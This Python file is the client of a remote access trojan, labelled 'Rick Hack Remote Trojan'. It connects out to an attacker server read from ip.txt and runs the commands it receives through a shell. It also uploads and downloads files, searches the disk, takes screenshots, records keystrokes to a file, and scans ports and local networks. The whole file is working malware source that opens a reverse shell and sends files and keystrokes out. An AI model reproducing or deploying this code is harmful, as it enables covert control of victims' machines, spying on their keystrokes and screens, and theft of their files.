# -*- coding: utf-8 -*-
#Rick Hack Remote Trojan v 1.0
#This is the client Code
#This script connect to remote server and give a reverse shell

#tested on Windows 7 System


#pip install image
#pip install socket
#pip install subprocess
#pip install os
#pip install random
#pip install time
#pip install pynput

#pip install scapy

#libraries
import socket
import subprocess
import os
import time
import random
import threading

import multiprocessing


from PIL import ImageGrab # Used to Grab a screenshot
import tempfile           # Used to Create a temp directory
import shutil             # Used to Remove the temp directory

#used to Keylogger
from pynput.keyboard import Key, Listener
from datetime import datetime


from scapy.all import ARP, Ether, srp


def networkscan(ip_range,c):
       # IP Address for the destination
       # create ARP packet
       arp = ARP(pdst=ip_range)
       # create the Ether broadcast packet
       # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
       ether = Ether(dst="ff:ff:ff:ff:ff:ff")
       # stack them
       packet = ether/arp

       result = srp(packet, timeout=3, verbose=0)[0]

       # a list of clients, we will fill this in the upcoming loop
       clients = []

       for sent, received in result:
           # for each response, append ip and mac address to `clients` list
           clients.append({'ip': received.psrc, 'mac': received.hwsrc})

       # print clients
       result=""
       result+=("Available devices in the network:" + '\n')
       result+=("IP" + " "*18+"MAC" + '\n')
       for client in clients:
              result+=("{:16}    {}".format(client['ip'], client['mac']) + '\n')

       print(result)
       c.send(result.encode())
       


#function to capture the key pressed and record in keylogger txt file
def on_press(key):

    global interact
    
    
    
    fp=open("keylogs.txt","a") #create a text file and append the key in it
    print(key)
    #avalidar a log
    today = datetime.now()
    now = today.ctime()
    fp.write(str(now) + " pressed key:  " + str(key)+ "\n")
    fp.close()
    interact += 1
    print(interact)
    
    #record only 10 digited key's
    if interact >= 10 :
        return False


#Principal function to enable the keylogger
def keylogger():
    global interact
    interact = int(0)

    #listenter object
    listener = Listener(on_press=on_press)
    listener.start()
    
    """while True:
        with Listener(on_press=on_press) as listener:
            print("algo")
            listener.join()
        break    
    """


#Function to call keylogger in threading mode
def keylogger_submit():
    #creating a thread to call function kaylogger()
    keylogger_thread = threading.Thread(target=keylogger(),args=())
    keylogger_thread.start()
    

   

def scan(ip_target,ports_target,c):
    c.send("Scanning for open ports \n".encode())
    meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    porta= ports_target.split(',')

    for porta in porta:
        xport = int(porta)
        result = ""
        if meusocket.connect_ex((ip_target, xport)) == 0:
            result =("Port " + porta + "[OPEN]" + "\n")
            print(result)
            c.send(result.encode())
            meusocket.close()
        else:
            result =("Port " + porta + "[CLOSED]" + "\n")
            print(result)
            c.send(result.encode())
    
                    

def transfer_up(c, command, path):
    f = open(path, 'wb')
    while True:
        bits = c.recv(2048)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            c.send('[+] upload transfer completed'.encode())
            break
        if 'file not found'.encode() in bits:
            c.send('[-] impossible to transfer'.encode())
            break
        f.write(bits)



def transfer(c, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(2048)
        while len(packet) > 0:
            c.send(packet)
            packet = f.read(2048)
        c.send('DONE'.encode())
        f.close()
    else:
        c.send('file not found'.encode())


def conexao():

    while True:
        #Get parameters from txt
        path = os.getcwd().strip('/n')
        print(path)
        file = os.path.join(path,'ip.txt')

        file = open(file)
        print(file)

        lines = file.readlines()

        #getting ip and port of remote server
        for lines in lines:
            ip = lines.split(',', 1)[0]
            port = int(lines.split(',', 1)[1])
            file.close()

        print("Remote server is")
        print(ip)
        print(port)
        c = socket.socket()
        c.connect((ip,port))
        
      
        while True:
            command = c.recv(2048)
            command = command.decode()
            print("comando executado:" + command)

            if 'terminate' in command:
                c.close()
                #break
                return 1

            #upload
            elif 'upload ' in command:
                path = os.getcwd()
                arquivo = command.split(" ",2)[2]
                print(arquivo)
                path =(path + "\\" + arquivo)
                transfer_up(c, command, path)

            elif 'download ' in command:
                download, path = command.split(' ')
                try:
                    transfer(c, path)
                except Exception as e:
                    c.send(str(e).encode())
                    pass

            elif 'cd ' in command:
                code, directory = command.split(' ')# the formula here is gonna be cd*directory
                try:
                    os.chdir(directory) # changing the directory
                    c.send(('[+] CWD is ' + os.getcwd()).encode()) # we send back a string mentioning the new CWD
                except Exception as e:
                    c.send(('[-]  ' + str(e)).encode())

            elif 'exit' in command:
                    print("ending of session!")
                    main()

            

            elif 'search' in command: #The Formula is search <path>*.<file extension>  -->for example let's say that we got search C:\\*.pdf
                command = command[7:] #cut off the the first 7 character ,, output would be  C:\\*.pdf
                path, ext = command.split('*')
                lists = '' # here we define a string where we will append our result on it

                for dirpath, dirname, files in os.walk(path):
                   for file in files:
                       if file.endswith(ext):
                           lists = lists + '\n' + os.path.join(dirpath, file)

                c.send(lists.encode())
                      

            elif 'screencap' in command:
                dirpath = tempfile.mkdtemp()
                print(dirpath)
                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
                path = "Generated in path: " + dirpath + "\img.jpg use download function to get your screencap file"
                print(path)
                c.send(path.encode())



            
            elif 'portscan ' in command:
                    print(command)
                    ip_target = command.split(' ')[1]
                    ports_target = command.split(' ')[2]
                    scan(ip_target,ports_target,c)
                    
                                    
            elif 'networkscan ' in command:
                    c.send("starting network scan...".encode())
                    ip_range = command.split(' ')[1]
                    networkscan(ip_range,c)
                    
            elif 'keylogger on' in command:
                time.sleep(1)
                c.send('Keylogger on'.encode())
                
                
               

                #Creating a subprocess to call keylogger_submit() function
                p = multiprocessing.Process(target=keylogger_submit())
                p.start()
                
                #wait 20 seconds, before kill the multiprocess of keylogger_submit()
                
                p.join(20)
                

                #killing process after seconds of wait but istill keyloggin in background
                #This is necessary to free the session of keylogger and make script able to
                #receive another commands
                if p.is_alive():
                    print("keylogger still running... let's kill it..")
                    p.terminate()
                    #listener.stop()
                    c.send('keylogger killed'.encode())
                    pass


                            


                
                
            #else another commands, for exemple, System Operation commands
            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                c.send(CMD.stdout.read())
                c.send(CMD.stderr.read())

                
        

def main():
 
    # verify if server is alive
    while True:
        try:
            if conexao() == 1:
                break
        except:
            sleep_for = random.randrange(1,2)
            time.sleep(int(sleep_for))

if __name__ == '__main__':
    main()

